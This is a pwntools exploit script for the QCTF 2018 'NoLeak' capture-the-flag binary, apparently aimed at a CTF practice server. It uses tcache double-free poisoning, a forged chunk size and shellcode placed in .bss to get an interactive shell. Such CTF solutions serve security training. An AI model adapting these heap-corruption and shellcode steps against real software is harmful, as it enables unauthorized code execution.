import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='QCTF_2018_NoLeak'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',27806)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=pdbg.run("local")
			io=pdbg.run("debug")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=pdbg.run("remote")
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('Size: ',str(a))
			io.sendafter('Data: ',c)

		def delete(a):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index: ',str(a))

		def edit(a,b,c):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index: ',str(a))
			io.sendlineafter('Size: ',str(b))
			io.sendafter('Data: ',c)



		add(0x78,'aaaa')
		add(0x478,'aaaa')
		add(0x78,'aaaa')
		add(0x78,'aaaa')
		add(0x78,'aaaa')

		delete(0)
		delete(0)
		delete(0)
		delete(0)
		edit(0,8,p64(elf.bss()+0x200))
		add(0x78,'aaaa')
		shell=asm(shellcraft.sh())
		add(0x78,shell)
		
		edit(0,0x90,'\x00'*0x78+p64(0x581))
		delete(1)
		delete(2)
		add(0x478,'aaaa')
		edit(2,1,'\x30')
		add(0x78,'\x30')
		add(0x78,p64(elf.bss()+0x200))
		io.sendlineafter('Your choice :','1')
		io.sendlineafter('Size: ',str(1))




		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue